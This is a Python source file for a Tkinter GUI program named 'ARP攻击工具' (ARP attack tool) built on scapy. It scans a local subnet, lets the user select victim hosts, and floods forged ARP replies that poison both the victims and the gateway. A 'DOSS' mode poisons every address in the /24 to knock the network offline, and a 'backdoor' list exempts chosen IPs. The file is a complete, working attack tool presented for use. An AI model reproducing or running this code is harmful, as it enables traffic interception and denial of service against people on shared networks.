import os
import time
import psutil
import socket
import threading
import tkinter as tk
from tkinter import messagebox, ttk, scrolledtext
from scapy.all import *
stop = 0
DOSS = 'OFF'
runarp = 'OFF'
rundoss = 'OFF'
List = []
all_ip = []
afterdoorip_list = []
target_ip_list = []


class ARPSpoofingApp:
    def __init__(self, root):
        # 获取点击的IP
        def on_item_click(event):
            global stop, target_ip_list
            if stop == 1:
                self.stop_spoofing()
                stop = 0
            item_id = self.tree.selection()
            item_values = self.tree.item(item_id, "values")
            List.append(item_values[0])
            target_ip_list = list(set(List))
            self.log_area2.configure(state='normal')  # 解除禁用状态
            self.log_area2.delete("1.0", tk.END)  # 执行删除操作
            self.log_area2.configure(state='disabled')  # 恢复禁用状态
            self.log2('当前选择的被攻击IP:')
            for i in range(len(target_ip_list)):
                self.log2(target_ip_list[i])
        self.root = root
        self.root.title("ARP攻击工具")
        self.root.geometry("750x500")
        # 网口选择组件
        self.interface_frame = tk.Frame(root)
        self.interface_frame.pack(fill=tk.X, padx=5, pady=5)

        tk.Label(self.interface_frame, text="选择网卡:").pack(side=tk.LEFT)
        self.interface_var = tk.StringVar()
        self.interface_combo = ttk.Combobox(self.interface_frame,
                                            textvariable=self.interface_var,
                                            state="readonly")
        self.interface_combo.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)

        self.refresh_button = tk.Button(self.interface_frame,
                                        text="刷新网卡",
                                        command=self.refresh_interfaces)
        self.refresh_button.pack(side=tk.LEFT, padx=5)

        # 初始化网卡列表
        self.refresh_interfaces()
        # 开始/结束ARP攻击
        self.start_button = tk.Button(
            root, text="开始ARP攻击", command=self.start_spoofing)
        self.start_button.pack()
        self.stop_button = tk.Button(
            root, text="停止ARP攻击", command=self.stop_spoofing, state=tk.DISABLED)
        self.stop_button.pack()
        # 清除ARP攻击列表
        self.qc_button = tk.Button(root, text="清除ARP攻击列表", command=self.cq)
        self.qc_button.place(x=640, y=40)
        # 扫描局域网
        self.scan_button = tk.Button(
            root, text="扫描局域网", command=self.scan_network)
        self.scan_button.place(x=0, y=40)
        self.qx_button = tk.Button(root, text="全选", command=self.qxip)
        self.qx_button.place(x=0, y=70)
        # 帮助
        self.button = tk.Button(root, text="帮助?", command=self.help)
        self.button.place(x=700, y=70)
        # 后门
        self.afterdoor_button = tk.Button(
            root, text="后门", command=self.afterdoor)
        self.afterdoor_button.place(x=70, y=40)
        # DOSS
        self.scan_button = tk.Button(
            root, text="DOSS-OFF",  command=self.doss)
        self.scan_button.place(x=35, y=70)
        # 打印扫描到的名单
        self.tree = ttk.Treeview(root, columns=("IP", "MAC"), show="headings")
        self.tree.heading("IP", text="IP名单")
        self.tree.heading("MAC", text="MAC名单")
        self.tree.pack(fill=tk.BOTH, expand=True)
        # 输出框
        self.log_label = tk.Label(root, text="输出:")
        self.log_label.pack()
        self.log_area = scrolledtext.ScrolledText(
            root, wrap="word", width=70, height=10)
        self.log_area.pack(side="left", fill="both",
                           expand=True, padx=5, pady=5)
        self.log_label2 = tk.Label(root, text="被攻击IP:")
        self.log_label2.pack()
        self.log_area2 = scrolledtext.ScrolledText(
            root, wrap="word", width=15, height=10)
        self.log_area2.pack(side="right", fill="both",
                            expand=True, padx=5, pady=5)
        # 清除log
        self.qcl_button = tk.Button(root, text="清除输出", command=self.qclog)
        self.qcl_button.place(x=640, y=70)
        # Status variables
        self.spoofing = False
        # 捕获鼠标点击
        self.tree.bind("<ButtonRelease-1>", on_item_click)

    def refresh_interfaces(self):
        global myiplist, interfaces, alllist
        interfaces = []
        alllist = []
        for name, addrs in psutil.net_if_addrs().items():
            if any(addr.family == socket.AF_INET for addr in addrs):
                interfaces.append(name)
        alllist = {name: [addr.address for addr in addrs if addr.family == 2]
                   for name, addrs in psutil.net_if_addrs().items()}
        self.interface_combo['values'] = interfaces

    def get_selected_interface(self):
        return self.interface_var.get()

    def afterdoor_del(self):
        global afterdoorip_list, target_ip_list
        target_ip_list = all_ip
        afterdoorip_list = []
        self.log_area3.configure(state='normal')  # 解除禁用状态
        self.log_area3.delete("1.0", tk.END)  # 执行删除操作
        self.log_area3.configure(state='disabled')  # 恢复禁用状态

    def afterdoor(self):
        global afterdoorip_list

        def on_item_clicka(event):
            global stop, afterdoorip_list
            if stop == 1:
                self.stop_spoofing()
                stop = 0
            item_id = self.treea.selection()
            item_values = self.treea.item(item_id, "values")
            afterdoorip_list.append(item_values[0])
            afterdoorip_list = list(set(afterdoorip_list))
            self.log_area3.configure(state='normal')  # 解除禁用状态
            self.log_area3.delete("1.0", tk.END)  # 执行删除操作
            self.log_area3.configure(state='disabled')  # 恢复禁用状态
            for i in range(len(afterdoorip_list)):
                self.log3(afterdoorip_list[i])
        roota = tk.Tk()
        self.roota = roota
        self.roota.title("ARP攻击工具-后门")
        self.roota.geometry("500x400")
        self.qca_button = tk.Button(
            roota, text="清除后门IP列表", command=self.afterdoor_del)
        self.qca_button.pack()
        self.treea = ttk.Treeview(roota, columns=("IP"), show="headings")
        self.treea.heading("IP", text="IP名单")
        self.treea.pack(fill=tk.BOTH, expand=True)
        self.log_label3 = tk.Label(roota, text="后门中的IP:")
        self.log_label3.pack()
        self.log_area3 = scrolledtext.ScrolledText(
            roota, wrap="word", width=15, height=10)
        self.log_area3.pack(fill="both", expand=True, padx=5, pady=5)
        for i in range(len(afterdoorip_list)):
            self.log3(afterdoorip_list[i])
        if DOSS == 'ON':
            for j in range(256):
                v = gateway_ip[:-1] + str(j)
                self.treea.insert("", tk.END, values=(v,))
        else:
            for ip in all_ip:
                self.treea.insert("", tk.END, values=(ip,))
        self.treea.bind("<ButtonRelease-1>", on_item_clicka)
        roota.mainloop()

    def qxip(self):
        global target_ip_list
        if all_ip == []:
            self.log("错误:请扫描局域网")
            messagebox.showerror("错误:", "请扫描局域网")
            return
        target_ip_list = all_ip
        self.log_area2.configure(state='normal')  # 解除禁用状态
        self.log_area2.delete("1.0", tk.END)  # 执行删除操作
        self.log_area2.configure(state='disabled')  # 恢复禁用状态
        self.log2('当前选择的被攻击IP:')
        for i in range(len(target_ip_list)):
            self.log2(target_ip_list[i])

    def qclog(self):
        self.log_area.configure(state='normal')  # 解除禁用状态
        self.log_area.delete("1.0", tk.END)  # 执行删除操作
        self.log_area.configure(state='disabled')  # 恢复禁用状态

    def qclog3(self):
        self.log_area3.configure(state='normal')  # 解除禁用状态
        self.log_area3.delete("1.0", tk.END)  # 执行删除操作
        self.log_area3.configure(state='disabled')  # 恢复禁用状态
    # 定义清除ARP攻击列表函数

    def cq(self):
        global target_ip_list, List, stop
        target_ip_list = []
        List = []
        if stop == 1:
            self.stop_spoofing()
            stop = 0
        self.log_area2.configure(state='normal')  # 解除禁用状态
        self.log_area2.delete("1.0", tk.END)  # 执行删除操作
        self.log_area2.configure(state='disabled')  # 恢复禁用状态
        self.log2('已清除ARP攻击列表')

    def help(self):
        self.log('帮助:点击"扫描局域网"可以扫描局域网的主机')
        self.log('   Linux环境无法获取网关IP,请手动输入后再次扫描局域网')
        self.log('   点击"清除ARP攻击列表"可以清除保存的被攻击IP')
        self.log('   点击"清除输出"可以清除输出框中的内容')
        self.log('   点击"结束ARP"攻击可以结束ARP攻击')
        self.log('   点击"开始ARP"攻击可以自动进行ARP攻击')
        self.log('   点击"全选"可以自动选中所有IP')
        self.log('   默认发送ARP数据包间隔100毫秒')

    def start_spoofing(self):
        if target_ip_list == [] and DOSS == 'OFF':
            self.log("错误:请点击 IP名单 中的某行或全选")
            messagebox.showerror("错误:", "请点击 IP名单 中的某行或全选")
            return
        self.spoofing = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.spoof_thread = threading.Thread(target=self.spoof)
        self.spoof_thread.daemon = True
        self.spoof_thread.start()
        if DOSS == 'OFF':
            self.log(f"开始ARP攻击:被攻击IP = {target_ip_list}, 网关IP = {gateway_ip}")

    def stop_spoofing(self):
        global stop, DOSS, runarp, rundoss
        rundoss = 'OFF'
        runarp = 'OFF'
        self.spoofing = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.log("停止ARP攻击")
        stop = 0

    def doss(self):
        global DOSS
        if self.scan_button["text"] == "DOSS-ON":
            self.scan_button.config(text="DOSS-OFF")
            DOSS = "OFF"
        else:
            self.scan_button.config(text="DOSS-ON")
            DOSS = "ON"

    def doss_s(self, vip):
        global rundoss
        s = 0
        for j in afterdoorip_list:
            if vip == j:
                s = 1
        while self.spoofing and s == 0 and runarp == 'OFF':
            rundoss = 'ON'
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                  ARP(pdst=vip, psrc=gateway_ip), verbose=0, iface=iface)
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                  ARP(pdst=gateway_ip, psrc=vip), verbose=0, iface=iface)
            time.sleep(0.3)

    def arpsp(self, i):
        global stop, runarp
        if self.spoofing:
            stop = 1
        else:
            stop = 0
        target_ip = target_ip_list[i]
        self.log(f"开始发送ARP数据包:被攻击IP = {target_ip},网关IP = {gateway_ip},线程号{i}")
        while self.spoofing and rundoss == 'OFF':
            runarp = 'ON'
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                  ARP(pdst=target_ip, psrc=gateway_ip), verbose=0, iface=iface)
            # 发送arp数据包给被攻击IP
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                  ARP(pdst=gateway_ip, psrc=target_ip), verbose=0, iface=iface)
            time.sleep(0.1)

    def spoof(self):
        global stop, DOSS, target_ip_list
        if DOSS == 'ON':
            self.log(
                f"开始ARP攻击:被攻击IP = {gateway_ip[:-1] +'0'}-{gateway_ip[:-1] +'255'}, 网关IP = {gateway_ip}")
            self.log_area2.configure(state='normal')  # 解除禁用状态
            self.log_area2.delete("1.0", tk.END)  # 执行删除操作
            self.log_area2.configure(state='disabled')  # 恢复禁用状态
            self.log2('当前选择的被攻击IP:')
            target_ip_list = list(set(target_ip_list))
            for d in range(256):
                vip = gateway_ip[:-1] + str(d)
                s = 0
                for j in afterdoorip_list:
                    if vip == j:
                        s = 1
                if self.spoofing and s == 0:
                    self.log2(vip)
                    self.log(
                        f"开始发送ARP数据包:被攻击IP = {vip},网关IP = {gateway_ip},线程号{d}")
                    thread = threading.Thread(target=self.doss_s, args=(vip,))
                    thread.start()
                time.sleep(0.01)
        else:
            a = 0
            target_ip_list = [
                x for x in target_ip_list if x not in afterdoorip_list]
            for i in range(len(target_ip_list)):
                thread = threading.Thread(target=self.arpsp, args=(i,))
                thread.start()
                # 每隔0.05秒启动一个线程
                time.sleep(0.05)

    def scan_network(self):
        global iface, myip, gateway_ip
        # 清除treeview
        for row in self.tree.get_children():
            self.tree.delete(row)

        iface = self.get_selected_interface()
        myip = alllist[iface]
        local_ip = self.get_local_ip()
        if not local_ip:
            self.log("错误:应该没有找到IP")
            messagebox.showerror("错误:", "应该没有找到IP")
            return
        gateway_ip = str(myip[:2])
        gateway_ip = gateway_ip[2:]
        subnet = (".".join(gateway_ip.split(".")[:-1])) + '.0/24'
        gateway_ip = (".".join(gateway_ip.split(".")[:-1]))+'.1'
        self.log(f"扫描的接口: {subnet}")

        def gatewayError():
            global gateway_ip

            def dy():
                global gateway_ip
                gateway_ip = entry.get()
                window.destroy()
            self.log("错误:没有找到网关IP")
            messagebox.showerror("错误:", "没有找到网关IP,请手动输入:")
            window = tk.Tk()
            window.geometry("100x80")
            label = tk.Label(window, text="输入:")
            label.pack()
            entry = tk.Entry(window, width=20)
            entry.pack()
            button = tk.Button(window, text="确定", command=dy)
            button.pack()
            window.mainloop()
        try:
            self.log(gateway_ip)
        except NameError:
            gatewayError()
        # 创建扫描线程
        self.scan_button.config(state=tk.DISABLED)
        self.scan_thread = threading.Thread(
            target=self.perform_arp_scan, args=(subnet,))
        self.scan_thread.daemon = True
        self.scan_thread.start()

    def perform_arp_scan(self, subnet):
        global all_ip, maclista
        all_ip = []
        maclista = []
        # 开始ARP扫描
        self.log("开始ARP扫描...")
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet,
                     psrc=gateway_ip), timeout=2, verbose=False, iface=iface)
        # 打印找到的主机在treeview中
        for _, rcv in ans:
            ip = rcv[ARP].psrc
            all_ip.append(ip)
            mac = rcv[Ether].src
            maclista.append(mac)
            self.tree.insert("", tk.END, values=(ip, mac))
            self.log(f"找到的主机: IP = {ip}, MAC = {mac}")
        self.log("ARP扫描结束.")
        self.scan_button.config(state=tk.NORMAL)

    def get_local_ip(self):
        try:
            # Create a socket to get the local IP address
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception as e:
            self.log(f"Error getting local IP: {e}")
            return None

    def log(self, message):
        # Enable the text area, insert the message, and disable it again
        self.log_area.config(state='normal')
        self.log_area.insert(tk.END, message + "\n")
        self.log_area.config(state='disabled')
        # Auto-scroll to the bottom
        self.log_area.yview(tk.END)

    def log2(self, message):
        # Enable the text area, insert the message, and disable it again
        self.log_area2.config(state='normal')
        self.log_area2.insert(tk.END, message + "\n")
        self.log_area2.config(state='disabled')
        # Auto-scroll to the bottom
        self.log_area2.yview(tk.END)

    def log3(self, message):
        # Enable the text area, insert the message, and disable it again
        self.log_area3.config(state='normal')
        self.log_area3.insert(tk.END, message + "\n")
        self.log_area3.config(state='disabled')
        # Auto-scroll to the bottom
        self.log_area3.yview(tk.END)


if __name__ == "__main__":
    root = tk.Tk()
    app = ARPSpoofingApp(root)
    root.mainloop()
